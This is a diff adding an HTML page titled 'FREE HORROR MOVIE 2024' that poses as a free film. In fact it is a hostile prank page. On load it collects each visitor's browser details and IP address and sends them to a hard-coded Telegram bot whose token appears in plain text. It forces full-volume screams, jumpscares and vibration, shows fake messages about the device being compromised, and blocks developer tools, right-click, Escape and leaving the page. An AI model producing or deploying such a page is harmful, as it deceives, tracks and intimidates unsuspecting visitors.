@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>FREE HORROR MOVIE 2024</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Arial Black', sans-serif;
+            background: #000;
+            color: #00ff00;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+            cursor: none;
+        }
+        #mainVideo {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            z-index: 1;
+            filter: hue-rotate(90deg) contrast(150%) brightness(70%);
+        }
+        #glitchOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><filter id="noise"><feTurbulence type="fractalNoise" baseFrequency="0.9" numOctaves="3" stitchTiles="stitch"/></filter><rect width="100" height="100" filter="url(%23noise)" opacity="0.3"/></svg>');
+            mix-blend-mode: overlay;
+            opacity: 0.5;
+            animation: glitch 0.1s infinite;
+            pointer-events: none;
+            z-index: 2;
+        }
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
+        #terrorText {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            pointer-events: none;
+            z-index: 3;
+            font-size: 40px;
+            text-align: center;
+            padding-top: 20vh;
+            color: #ff0000;
+            text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
+            animation: flicker 0.5s infinite;
+        }
+        @keyframes flicker {
+            0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; }
+            20%, 24%, 55% { opacity: 0; }
+        }
+        #jumpscare {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #000;
+            z-index: 99999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+        #jumpscareImg {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            animation: zoomIn 0.3s ease-out;
+        }
+        @keyframes zoomIn {
+            from { transform: scale(0.5); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        #volumeWarning {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #ff0000;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            z-index: 4;
+            font-size: 14px;
+            display: none;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        .bloodEffect {
+            position: fixed;
+            width: 100px;
+            height: 100px;
+            background: radial-gradient(circle, rgba(255,0,0,0.8) 0%, rgba(255,0,0,0) 70%);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 5;
+            animation: drip 3s linear forwards;
+        }
+        @keyframes drip {
+            0% { transform: translateY(-100px) scale(0); opacity: 1; }
+            100% { transform: translateY(100vh) scale(1.5); opacity: 0; }
+        }
+        #distortion {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: linear-gradient(45deg, #ff00ff, #00ffff, #ffff00);
+            mix-blend-mode: difference;
+            opacity: 0.3;
+            z-index: 6;
+            animation: distort 2s infinite alternate;
+            pointer-events: none;
+        }
+        @keyframes distort {
+            0% { transform: skew(0deg) scale(1); }
+            100% { transform: skew(5deg) scale(1.1); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Main video -->
+    <video id="mainVideo" autoplay muted playsinline></video>
+    
+    <!-- Visual effects -->
+    <div id="glitchOverlay"></div>
+    <div id="distortion"></div>
+    <div id="terrorText">I AM SICK BUT NOT DEAD</div>
+    <div id="volumeWarning">⚠️ VOLUME MAXIMUM ⚠️</div>
+    
+    <!-- Jump scare container -->
+    <div id="jumpscare">
+        <img id="jumpscareImg" src="https://files.catbox.moe/2w8q9p.png" alt="JUMPSCARE">
+    </div>
+
+    <!-- Hidden audio elements -->
+    <audio id="mainAudio" loop></audio>
+    <audio id="screamAudio"></audio>
+    <audio id="whisperAudio" loop></audio>
+    <audio id="noiseAudio" loop></audio>
+
+    <script>
+        // ================= TERROR CONFIG =================
+        const TERROR_CONFIG = {
+            // Video & Audio URLs
+            videoUrl: "https://files.catbox.moe/al97sl.mp4",
+            mainAudioUrl: "https://files.catbox.moe/3al0dz.mp4",
+            screamUrls: [
+                "https://files.catbox.moe/7yf8jx.mp3",  // Scream 1
+                "https://files.catbox.moe/hd9k3s.mp3",  // Scream 2
+                "https://files.catbox.moe/l2p7qw.mp3",  // Scream 3
+                "https://files.catbox.moe/n4m5vx.mp3"   // Scream 4
+            ],
+            whisperUrl: "https://files.catbox.moe/k3j8hd.mp3",
+            noiseUrl: "https://files.catbox.moe/p9q2rz.mp3",
+            
+            // Jump scare images
+            jumpscareImages: [
+                "https://files.catbox.moe/2w8q9p.png",
+                "https://files.catbox.moe/5t7v1x.png",
+                "https://files.catbox.moe/8m3n6b.png"
+            ],
+            
+            // Telegram config
+            botToken: "8553904025:AAHwTlcsOR7swkUKmpnWCZgWaCFyNmVgi-w",
+            chatId: "6404359541"
+        };
+
+        // ================= TERROR SYSTEM =================
+        class TerrorAttack {
+            constructor() {
+                this.audioElements = {
+                    main: document.getElementById('mainAudio'),
+                    scream: document.getElementById('screamAudio'),
+                    whisper: document.getElementById('whisperAudio'),
+                    noise: document.getElementById('noiseAudio')
+                };
+                this.terrorLevel = 0;
+                this.maxTerror = 100;
+                this.jumpscareCount = 0;
+                this.maxJumpscares = 5;
+            }
+            
+            // Initialize all terror
+            async startTerror() {
+                console.log("💀 TERROR ATTACK INITIATED 💀");
+                
+                // 1. Force fullscreen video
+                this.playVideo();
+                
+                // 2. Start audio layers
+                setTimeout(() => this.startAudioLayers(), 1000);
+                
+                // 3. Gradual terror increase
+                setInterval(() => this.increaseTerror(), 3000);
+                
+                // 4. Random jumpscares
+                setInterval(() => this.randomJumpscare(), Math.random() * 10000 + 5000);
+                
+                // 5. Send data to Telegram
+                this.collectAndSendData();
+            }
+            
+            // Play video with forced attributes
+            playVideo() {
+                const video = document.getElementById('mainVideo');
+                video.src = TERROR_CONFIG.videoUrl;
+                video.muted = false; // Force unmute
+                video.volume = 1.0;
+                
+                // Try to play with user interaction fallback
+                video.play().catch(e => {
+                    document.body.addEventListener('click', () => {
+                        video.play();
+                        video.volume = 1.0;
+                    }, { once: true });
+                });
+                
+                // Show volume warning
+                document.getElementById('volumeWarning').style.display = 'block';
+            }
+            
+            // Start multiple audio layers
+            startAudioLayers() {
+                // Layer 1: Main creepy audio (LOOP)
+                this.audioElements.main.src = TERROR_CONFIG.mainAudioUrl;
+                this.audioElements.main.volume = 1.0;
+                this.audioElements.main.loop = true;
+                this.playAudioWithRetry(this.audioElements.main);
+                
+                // Layer 2: Whispering (LOOP)
+                setTimeout(() => {
+                    this.audioElements.whisper.src = TERROR_CONFIG.whisperUrl;
+                    this.audioElements.whisper.volume = 0.7;
+                    this.audioElements.whisper.loop = true;
+                    this.playAudioWithRetry(this.audioElements.whisper);
+                }, 2000);
+                
+                // Layer 3: White noise (LOOP)
+                setTimeout(() => {
+                    this.audioElements.noise.src = TERROR_CONFIG.noiseUrl;
+                    this.audioElements.noise.volume = 0.5;
+                    this.audioElements.noise.loop = true;
+                    this.playAudioWithRetry(this.audioElements.noise);
+                }, 4000);
+                
+                // Random screams
+                setInterval(() => {
+                    if (this.terrorLevel > 30) {
+                        this.playRandomScream();
+                    }
+                }, Math.random() * 8000 + 4000);
+            }
+            
+            // Play audio with retry
+            playAudioWithRetry(audioElement) {
+                audioElement.play().catch(e => {
+                    // Wait for user interaction
+                    const playOnInteraction = () => {
+                        audioElement.play();
+                        document.body.removeEventListener('click', playOnInteraction);
+                    };
+                    document.body.addEventListener('click', playOnInteraction);
+                });
+            }
+            
+            // Play random scream
+            playRandomScream() {
+                if (this.jumpscareCount < this.maxJumpscares) {
+                    const screamUrl = TERROR_CONFIG.screamUrls[
+                        Math.floor(Math.random() * TERROR_CONFIG.screamUrls.length)
+                    ];
+                    
+                    this.audioElements.scream.src = screamUrl;
+                    this.audioElements.scream.volume = 1.0;
+                    this.audioElements.scream.currentTime = 0;
+                    
+                    this.audioElements.scream.play().catch(e => {
+                        // If blocked, try to play on next interaction
+                        document.body.addEventListener('click', 
+                            () => this.audioElements.scream.play(), 
+                            { once: true }
+                        );
+                    });
+                    
+                    // Blood effect
+                    this.createBloodEffect();
+                    
+                    // Device vibration if supported
+                    if (navigator.vibrate) {
+                        navigator.vibrate([500, 200, 1000]);
+                    }
+                }
+            }
+            
+            // Create blood drip effect
+            createBloodEffect() {
+                for (let i = 0; i < 10; i++) {
+                    setTimeout(() => {
+                        const blood = document.createElement('div');
+                        blood.className = 'bloodEffect';
+                        blood.style.left = Math.random() * 90 + 'vw';
+                        blood.style.top = '-100px';
+                        document.body.appendChild(blood);
+                        
+                        // Remove after animation
+                        setTimeout(() => {
+                            if (blood.parentNode) {
+                                blood.parentNode.removeChild(blood);
+                            }
+                        }, 3000);
+                    }, i * 200);
+                }
+            }
+            
+            // Random jumpscare
+            randomJumpscare() {
+                if (this.jumpscareCount >= this.maxJumpscares) return;
+                
+                const jumpscareDiv = document.getElementById('jumpscare');
+                const jumpscareImg = document.getElementById('jumpscareImg');
+                
+                // Random jumpscare image
+                const randomImage = TERROR_CONFIG.jumpscareImages[
+                    Math.floor(Math.random() * TERROR_CONFIG.jumpscareImages.length)
+                ];
+                
+                jumpscareImg.src = randomImage;
+                jumpscareDiv.style.display = 'flex';
+                
+                // Play scream with jumpscare
+                this.playRandomScream();
+                
+                // Hide after 1 second
+                setTimeout(() => {
+                    jumpscareDiv.style.display = 'none';
+                    this.jumpscareCount++;
+                }, 1000);
+                
+                // Intensify terror
+                this.terrorLevel += 20;
+                this.updateTerrorEffects();
+            }
+            
+            // Increase terror level gradually
+            increaseTerror() {
+                if (this.terrorLevel < this.maxTerror) {
+                    this.terrorLevel += 10;
+                    this.updateTerrorEffects();
+                }
+            }
+            
+            // Update visual effects based on terror level
+            updateTerrorEffects() {
+                const terrorText = document.getElementById('terrorText');
+                
+                // Change text based on terror level
+                const texts = [
+                    "I AM SICK BUT NOT DEAD",
+                    "YOUR DATA IS MINE",
+                    "CYBER FORCE CONTROLS YOU",
+                    "DEVICE COMPROMISED",
+                    "VIRUS ACTIVATED",
+                    "SCREAM LOUDER",
+                    "I CAN SEE YOU",
+                    "DON'T TURN AROUND",
+                    "BEHIND YOU",
+                    "IT'S TOO LATE"
+                ];
+                
+                terrorText.textContent = texts[Math.floor(Math.random() * texts.length)];
+                terrorText.style.fontSize = (40 + this.terrorLevel * 0.5) + 'px';
+                terrorText.style.color = `hsl(${this.terrorLevel}, 100%, 50%)`;
+                
+                // Increase audio volume
+                const volumeIncrease = this.terrorLevel / 100;
+                this.audioElements.main.volume = Math.min(1.0, 0.5 + volumeIncrease);
+                this.audioElements.whisper.volume = Math.min(0.8, 0.3 + volumeIncrease);
+                
+                // Intensify glitch effect
+                const glitchOverlay = document.getElementById('glitchOverlay');
+                glitchOverlay.style.opacity = 0.3 + (this.terrorLevel / 100) * 0.7;
+                
+                // Increase distortion
+                const distortion = document.getElementById('distortion');
+                distortion.style.opacity = 0.1 + (this.terrorLevel / 100) * 0.4;
+            }
+            
+            // Collect and send data
+            async collectAndSendData() {
+                try {
+                    // Collect basic info
+                    const data = {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        screen: `${screen.width}x${screen.height}`,
+                        timestamp: new Date().toISOString(),
+                        terrorLevel: this.terrorLevel,
+                        jumpscares: this.jumpscareCount
+                    };
+                    
+                    // Get IP
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    data.ip = ipData.ip;
+                    
+                    // Send to Telegram
+                    this.sendToTelegram(data);
+                    
+                } catch (e) {
+                    console.error("Data collection failed:", e);
+                }
+            }
+            
+            // Send to Telegram
+            sendToTelegram(data) {
+                const message = `
+💀 CYBER FORCE - TERROR ATTACK ACTIVE 💀
+
+📱 Device: ${data.userAgent}
+📍 IP: ${data.ip || 'Unknown'}
+🖥 Screen: ${data.screen}
+📈 Terror Level: ${data.terrorLevel}/100
+😱 Jumpscares Triggered: ${data.jumpscares}
+⏰ Time: ${data.timestamp}
+
+🔊 AUDIO MAXIMUM VOLUME
+🎬 VIDEO DISTORTION ACTIVE
+👻 JUMPSCARES: ${this.jumpscareCount}/${this.maxJumpscares}
+
+TARGET IS EXPERIENCING FULL TERROR MODE
+                `;
+                
+                const url = `https://api.telegram.org/bot${TERROR_CONFIG.botToken}/sendMessage?chat_id=${TERROR_CONFIG.chatId}&text=${encodeURIComponent(message)}`;
+                
+                fetch(url).catch(e => {
+                    // Retry if failed
+                    setTimeout(() => fetch(url), 2000);
+                });
+            }
+        }
+        
+        // ================= BLOCK USER ESCAPE =================
+        // Prevent leaving
+        window.onbeforeunload = function(e) {
+            e.preventDefault();
+            e.returnValue = "Leaving will trigger permanent audio!";
+            return e.returnValue;
+        };
+        
+        // Disable right click
+        document.addEventListener('contextmenu', e => {
+            e.preventDefault();
+            alert("⚠️ RIGHT CLICK DISABLED BY CYBER FORCE ⚠️");
+            return false;
+        });
+        
+        // Block keyboard shortcuts
+        document.addEventListener('keydown', (e) => {
+            // Block F12, Ctrl+Shift+I, Ctrl+U, etc
+            if (
+                e.key === 'F12' ||
+                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                (e.ctrlKey && e.key === 'U') ||
+                (e.ctrlKey && e.key === 'S') ||
+                e.key === 'Escape'
+            ) {
+                e.preventDefault();
+                // Trigger jumpscare on escape attempt
+                if (e.key === 'Escape') {
+                    const terror = new TerrorAttack();
+                    terror.randomJumpscare();
+                }
+                return false;
+            }
+        });
+        
+        // Disable touch gestures (mobile)
+        document.addEventListener('touchmove', (e) => {
+            if (e.touches.length > 1) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+        
+        // ================= START TERROR =================
+        window.onload = function() {
+            const terrorAttack = new TerrorAttack();
+            terrorAttack.startTerror();
+            
+            // Force start on any click
+            document.body.addEventListener('click', () => {
+                terrorAttack.startAudioLayers();
+            }, { once: true });
+            
+            // Increase volume to max
+            setTimeout(() => {
+                if (terrorAttack.audioElements.main) {
+                    terrorAttack.audioElements.main.volume = 1.0;
+                }
+            }, 5000);
+        };
+        
+        // ================= AUTO REFRESH AFTER 2 MINUTES =================
+        setTimeout(() => {
+            window.location.reload();
+        }, 120000);
+    </script>
+</body>
+</html>
